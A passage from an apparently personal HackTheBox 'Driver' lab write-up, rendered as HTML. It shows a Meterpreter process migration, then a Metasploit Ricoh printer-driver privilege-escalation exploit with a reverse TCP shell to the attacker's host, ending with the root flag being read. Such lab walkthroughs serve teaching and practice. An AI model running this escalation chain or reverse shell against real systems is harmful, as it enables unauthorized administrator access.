+</span></span><span class=line><span class=cl> <span class=m>4896</span>  <span class=m>3284</span>  OneDrive.exe             x86   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\U</span>sers<span class=se>\t</span>ony<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\M</span>icrosoft<span class=se>\O</span>neDrive<span class=se>\O</span>neDrive.exe
+</span></span></code></pre></td></tr></table></div></div><p>The ones with <em>Session = 1</em> can interact with the Desktop, let&rsquo;s migrate to <code>OneDrive</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Meterpreter 5<span class=o>)(</span>C:<span class=se>\p</span>rogramdata<span class=o>)</span> &gt; migrate <span class=m>4896</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Migrating from <span class=m>4116</span> to 4896...
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Migration completed successfully.
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 5<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=o>)</span> &gt; getpid
+</span></span><span class=line><span class=cl>Current pid: <span class=m>4896</span>
+</span></span></code></pre></td></tr></table></div></div><p>Now we try <strong>RICOH</strong> again:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf<span class=o>](</span>Jobs:0 Agents:2<span class=o>)</span> exploit<span class=o>(</span>windows/local/ricoh_driver_privesc<span class=o>)</span> &gt;&gt; options
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Module options <span class=o>(</span>exploit/windows/local/ricoh_driver_privesc<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name     Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----     ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   SESSION  <span class=m>1</span>                yes       The session to run this module on
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>windows/x64/meterpreter/reverse_tcp<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   EXITFUNC  process          yes       Exit technique <span class=o>(</span>Accepted: <span class=s1>&#39;&#39;</span>, seh, thread, process, none<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LHOST     tun1             yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LPORT     <span class=m>4444</span>             yes       The listen port
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Exploit target:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Id  Name
+</span></span><span class=line><span class=cl>   --  ----
+</span></span><span class=line><span class=cl>   <span class=m>0</span>   Windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o><a class="internal-link broken"></span>msf<span class=o></a></span> exploit<span class=o>(</span>windows/local/ricoh_driver_privesc<span class=o>)</span> &gt;&gt; sessions -l
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Active <span class=nv>sessions</span>
+</span></span><span class=line><span class=cl><span class=o>===============</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  Id  Name  Type                     Information           Connection
+</span></span><span class=line><span class=cl>  --  ----  ----                     -----------           ----------
+</span></span><span class=line><span class=cl>  <span class=m>3</span>         meterpreter x86/windows  DRIVER<span class=se>\t</span>ony @ DRIVER  10.10.14.12:9001 -&gt; 10.10.11.106:49450 <span class=o>(</span>10.10.11.106<span class=o>)</span>
+</span></span><span class=line><span class=cl>  <span class=m>5</span>         meterpreter x86/windows  DRIVER<span class=se>\t</span>ony @ DRIVER  10.10.14.12:9001 -&gt; 10.10.11.106:49452 <span class=o>(</span>10.10.11.106<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o><a class="internal-link broken"></span>msf<span class=o></a></span> exploit<span class=o>(</span>windows/local/ricoh_driver_privesc<span class=o>)</span> &gt;&gt; <span class=nb>set</span> SESSION <span class=m>5</span>
+</span></span><span class=line><span class=cl><span class=nv>SESSION</span> <span class=o>=</span>&gt; <span class=m>5</span>
+</span></span><span class=line><span class=cl><span class=o><a class="internal-link broken"></span>msf<span class=o></a></span> exploit<span class=o>(</span>windows/local/ricoh_driver_privesc<span class=o>)</span> &gt;&gt; run
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.12:4444 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Running automatic check <span class=o>(</span><span class=s2>&#34;set AutoCheck false&#34;</span> to disable<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The target appears to be vulnerable. Ricoh driver directory has full permissions
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Adding printer pqsAiaGG...
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>200774</span> bytes<span class=o>)</span> to 10.10.11.106
+</span></span></code></pre></td></tr></table></div></div><p>We <code>ctrl+c</code> and go to the session, it worked!!!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Meterpreter 6<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=o>)</span> &gt; ls
+</span></span><span class=line><span class=cl>Listing: C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl><span class=o>=======================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Mode              Size  Type  Last modified              Name
+</span></span><span class=line><span class=cl>----              ----  ----  -------------              ----
+</span></span><span class=line><span class=cl>100666/rw-rw-rw-  <span class=m>282</span>   fil   2021-06-11 11:57:47 +0100  desktop.ini
+</span></span><span class=line><span class=cl>100444/r--r--r--  <span class=m>34</span>    fil   2022-07-18 01:23:19 +0100  root.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 6<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=o>)</span> &gt; cat root.txt 
+</span></span><span class=line><span class=cl>326e9952dcf20633ad8cab171735a2be
+</span></span></code></pre></td></tr></table></div></div><a href=#reference><h2 id=reference><span class=hanchor arialabel=Anchor># </span>Reference</h2></a><ul><li>IppSec - Driver (
+<a href="https://www.youtube.com/watch?v=N2ahkarb-zI&t=634s" rel=noopener>Video</a>)</li></ul></article><hr><div class=page-end><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/quartz/notes/general/hackthebox/ data-ctx=Driver data-src=/notes/general/hackthebox class=internal-link>HackTheBox</a></li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://pietraferreira.github.io/quartz/js/graph.afdb02e537635f9a611b53a988e5645b.js></script></div></div><div id=contact_buttons><footer><p>Made by Morioh using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2022</p><ul><li><a href=https://pietraferreira.github.io/quartz/>Home</a></li><li><a href=https://github.com/pietraferreira>Github</a></li></ul></footer></div></div></body></html>
